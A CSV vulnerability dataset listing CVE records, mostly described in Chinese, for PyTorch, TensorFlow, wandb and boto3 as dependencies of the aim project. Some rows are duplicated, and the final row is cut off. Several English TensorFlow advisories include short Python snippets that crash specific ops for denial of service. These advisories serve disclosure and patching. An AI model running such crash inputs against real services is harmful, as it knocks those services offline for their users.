aimhubio_aim,torch,1.2.0,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
aimhubio_aim,torch,1.2.0,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
aimhubio_aim,torch,1.2.0,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
aimhubio_aim,torch,1.2.0,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
aimhubio_aim,torch,1.2.0,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
aimhubio_aim,torch,1.2.0,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
aimhubio_aim,torch,1.2.0,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
aimhubio_aim,torch,1.2.0,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
aimhubio_aim,torch,1.2.0,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
aimhubio_aim,torch,1.2.0,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
aimhubio_aim,wandb,0.13.1,True,CVE-2024-4642,CWE-918,2024-05-16,wandb 是一个用于与 Weights and Biases API 交互的命令行工具和库，旨在帮助开发者和数据科学家轻松管理和优化机器学习实验。受影响的版本由于对 HTTP 302 重定向的处理不当，导致存在服务器端请求伪造 (SSRF) 漏洞。攻击者可以通过 '用户设置 -> Webhooks' 功能，构造恶意请求，进而能够访问内部 HTTP(s) 服务器。,2,0
aimhubio_aim,boto3,,True,,CWE-200,2017-03-10,"## Overview
[`boto3`](https://pypi.python.org/pypi/boto3) is the AWS SDK for Python.

Affected versions of this package are vulnerable to Information Exposure due to logging all of the bytes uploaded when the logger is set to the `INFO` level.

## Remediation
Upgrade `boto3` to version 1.4.5 or higher.

## References
- [GitHub Issue](https://github.com/boto/boto3/issues/1017)
- [GitHub Commit](https://github.com/boto/boto3/commit/5a4396a4e0d1b337c081cb4095e5255da915198e)",4,0
aimhubio_aim,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
aimhubio_aim,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
aimhubio_aim,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
aimhubio_aim,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
aimhubio_aim,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
aimhubio_aim,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
aimhubio_aim,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
aimhubio_aim,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
aimhubio_aim,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
aimhubio_aim,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
aimhubio_aim,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
aimhubio_aim,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
aimhubio_aim,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
aimhubio_aim,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
aimhubio_aim,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
aimhubio_aim,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
aimhubio_aim,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
aimhubio_aim,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
aimhubio_aim,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
aimhubio_aim,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
aimhubio_aim,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
aimhubio_aim,tensorflow,,True,,CWE-190,2022-05-26,"### Impact
The implementation of depthwise ops in TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) caused by overflowing the number of elements in a tensor:

```python
import tensorflow as tf

input = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
filter_sizes = tf.constant(1879048192, shape=[13], dtype=tf.int32)
out_backprop = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
tf.raw_ops.DepthwiseConv2dNativeBackpropFilter(
    input=input, filter_sizes=filter_sizes, out_backprop=out_backprop, strides=[1, 1, 1, 1], padding=""SAME"")
```
  
This is another instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197).
  
### Patches
We have patched the issue in GitHub commit [3796cc4fcd93ae55812a457abc96dcd55fbb854b](https://github.com/tensorflow/tensorflow/commit/3796cc4fcd93ae55812a457abc96dcd55fbb854b).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",3,-2
aimhubio_aim,tensorflow,,True,CVE-2021-37680,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于在受影响的版本中，TFLite 中全连接层的实现易受零错误除法。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-37682,CWE-908,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google Tensorflow 存在代码问题漏洞，该漏洞源于产品使用量化的 TFLite 操作使用了未初始化的值。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-37687,CWE-125,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于通过在 indices 中具有负值的模型来从堆中读取任意数据。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-37683,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于TFLite 中除法的实现易受 0 错误除法的影响。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-37685,CWE-125,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于TensorFlow 可能允许本地经过身份验证的攻击者获取敏感信息，这是由 TFLite 中 expand_dims.cc 中的堆越界读取缺陷引起的。通过发送特制的请求，攻击者可以利用此漏洞读取堆分配数据边界之外的一个元素，并使用此信息对受影响的系统发起进一步攻击。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-37689,CWE-476,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，该漏洞源于在受影响的版本中，L2NormalizeReduceAxis 运算符的 MLIR 优化存在问题。攻击者可利用该漏洞制作一个 TFLite 模型来触发空指针取消引用，这将导致崩溃和拒绝服务。",2,0
aimhubio_aim,tensorflow,,True,,CWE-354,2022-02-10,"### Impact
The implementation of [`tf.sparse.split`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/sparse_split_op.cc#L26-L102) does not fully validate the input arguments. Hence, a malicious user can trigger a denial of service via a segfault or a heap OOB read:

```python
import tensorflow as tf
data = tf.random.uniform([1, 32, 32], dtype=tf.float32)
axis = [1, 2]
x = tf.sparse.from_dense(data)
result = tf.sparse.split(x,3, axis=axis)
```
The code assumes `axis` is a scalar. This is another instance of [TFSA-2021-190](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-190.md) (CVE-2021-41206).

### Patches
We have patched the issue in GitHub commit [61bf91e768173b001d56923600b40d9a95a04ad5](https://github.com/tensorflow/tensorflow/commit/61bf91e768173b001d56923600b40d9a95a04ad5) (merging [#53695](https://github.com/tensorflow/tensorflow/pull/53695)).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/53660).",2,0
aimhubio_aim,tensorflow,,True,,CWE-476 CWE-824,2022-02-10,"### Impact 
The [code for boosted trees in TensorFlow](https://github.com/tensorflow/tensorflow/blob/e0b6e58c328059829c3eb968136f17aa72b6c876/tensorflow/core/kernels/boosted_trees/stats_ops.cc) is still missing validation. This allows malicious users to read and write outside of bounds of heap allocated data as well as trigger denial of service (via dereferencing `nullptr`s or via `CHECK`-failures).

This follows after CVE-2021-41208 where these APIs were still vulnerable to multiple security issues.

**Note**: Given that the boosted trees implementation in TensorFlow is unmaintained, it is recommend to no longer use these APIs.  Instead, please use the downstream [TensorFlow Decision Forests](https://github.com/tensorflow/decision-forests) project which is newer and supports more features. 
  
These APIs are now deprecated in TensorFlow 2.8. We will remove TensorFlow's boosted trees APIs in subsequent releases.
  
### Patches
We have patched the known issues in multiple GitHub commits.
  
The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

This should allow users to use existing boosted trees APIs for a while until they migrate to [TensorFlow Decision Forests](https://github.com/tensorflow/decision-forests), while guaranteeing that known vulnerabilities are fixed.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
These vulnerabilities have been reported by Yu Tian of Qihoo 360 AIVul Team and Faysal Hossain Shezan from University of Virginia. Some of the issues have been discovered internally after a careful audit of the APIs.",1,0
aimhubio_aim,tensorflow,,True,,CWE-190,2022-02-10,"### Impact
The Grappler component of TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) in [constant folding](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/constant_folding.cc#L963-L1035):

```cc
  for (const auto& output_prop : output_props) {
    const PartialTensorShape output_shape(output_prop.shape());
    // ...
  }
```
  
The `output_prop` tensor has a shape that is controlled by user input and this can result in triggering one of the `CHECK`s in the `PartialTensorShape` constructor. This is an instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197).

### Patches
We have patched the issue in GitHub commit [be7b286d40bc68cb0b56f702186cc4837d508058](https://github.com/tensorflow/tensorflow/commit/be7b286d40bc68cb0b56f702186cc4837d508058).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",3,0
aimhubio_aim,tensorflow,,True,,,2022-11-22,"### Impact
Another instance of CVE-2022-35935, where `SobolSample` is vulnerable to a denial of service via assumed scalar inputs, was found and fixed.
```python
import tensorflow as tf
tf.raw_ops.SobolSample(dim=tf.constant([1,0]), num_results=tf.constant([1]), skip=tf.constant([1]))
```

### Patches
We have patched the issue in GitHub commits [c65c67f88ad770662e8f191269a907bf2b94b1bf](https://github.com/tensorflow/tensorflow/commit/c65c67f88ad770662e8f191269a907bf2b94b1bf) and [02400ea266bd811fc016a848445de1bbff3a23a0](https://github.com/tensorflow/tensorflow/commit/02400ea266bd811fc016a848445de1bbff3a23a0)

The fix will be included in TensorFlow 2.11. We will also cherrypick both commits on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range. TensorFlow 2.7.4 will have the first commit cherrypicked.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by:
- Kang Hong Jin from Singapore Management University
- Neophytos Christou, Secure Systems Labs, Brown University
- 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology
- Pattarakrit Rattankul
",4,-2
aimhubio_aim,tensorflow,,True,,,2022-11-22,"### Impact
Another instance of CVE-2022-35991, where `TensorListScatter` and `TensorListScatterV2` crash via non scalar inputs in`element_shape`, was found in eager mode and fixed.
```python
import tensorflow as tf
arg_0=tf.random.uniform(shape=(2, 2, 2), dtype=tf.float16, maxval=None)
arg_1=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_3=''
tf.raw_ops.TensorListScatter(tensor=arg_0, indices=arg_1, 
element_shape=arg_2, name=arg_3)
```

### Patches
We have patched the issue in GitHub commit [bf9932fc907aff0e9e8cccf769e8b00d30fd81a1](https://github.com/tensorflow/tensorflow/commit/bf9932fc907aff0e9e8cccf769e8b00d30fd81a1).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Pattarakrit Rattankul
",4,-2
aimhubio_aim,tensorflow,,True,CVE-2021-41219,CWE-824 CWE-125,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于在受影响的版本中，稀疏矩阵乘法的代码通过绑定对“nullptr”的引用而容易受到未定义行为的影响。",2,0
aimhubio_aim,tensorflow,,True,,CWE-400,2022-05-26,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to Denial of Service (DoS). The implementation of depthwise ops in TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) caused by overflowing the number of elements in a tensor:

```python
import tensorflow as tf

input = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
filter_sizes = tf.constant(1879048192, shape=[13], dtype=tf.int32)
out_backprop = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
tf.raw_ops.DepthwiseConv2dNativeBackpropFilter(
    input=input, filter_sizes=filter_sizes, out_backprop=out_backprop, strides=[1, 1, 1, 1], padding=""SAME"")
```
  
This is due to an incomplete fix for [CVE-2021-41197](https://security.snyk.io/vuln/?search=CVE-2021-41197).

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `tensorflow` to version 2.8.1, 2.7.2, 2.6.4 or higher.
## References
- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/3796cc4fcd93ae55812a457abc96dcd55fbb854b)
- [Tensorflow Advisory](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md)
",2,2
aimhubio_aim,tensorflow,,True,CVE-2022-35965,CWE-476,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，该漏洞源于如果为 LowerBound 或 UpperBound 提供了一个空的 sorted_inputs 输入，它会导致 nullptr 取消引用，从而导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-29607,CWE-754,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4版本存在代码问题漏洞，该漏洞源于SparseAdd中不完整的验证会导致攻击者可利用该漏洞利用未定义的行为(对空指针进行解引用)，以及写入堆分配数据的边界之外。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-37640,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于tensorflow, tensorflow-cpu, tensorflow-gpu中的除以0错误。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-36000,CWE-476,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 mlir::tfg::ConvertGenericFunctionToFunctionDef 被赋予空函数属性时，它给出一个空解引用。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-29208,CWE-787,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在缓冲区错误漏洞，该漏洞源于tf.raw_ops.EditDistance对于实现的验证不完整。攻击者可以传递负值来利用该漏洞触发基于分段错误的拒绝服务。",2,0
aimhubio_aim,tensorflow,,True,CVE-2022-23584,CWE-416,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
